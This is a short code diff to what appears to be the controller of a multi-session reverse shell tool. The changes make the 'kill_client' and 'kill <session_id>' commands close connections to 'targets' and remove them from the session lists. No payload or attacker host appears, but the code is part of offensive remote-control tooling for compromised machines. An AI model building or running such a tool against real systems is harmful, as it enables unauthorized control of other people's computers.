@@ -29,6 +29,9 @@ def shell(target, ip):
         if cmd == "background":
             break
         elif cmd == "kill_client":
+            target.close()
+            targets.remove(target)
+            ips.remove(ip)
             break
         elif cmd[:2] == "cd" and len(cmd) > 2: #only if cd and a path (if cd only it runs as normal command)
             continue
@@ -107,6 +110,7 @@ while True:
     elif cmd[:4] == "kill":
         try:
             session_id = int(cmd[5:])
+            targets[session_id].close()
             targets.pop(session_id) #only remove session from list (connection still alive)
             ips.pop(session_id)
             #need to implement how to terminate session
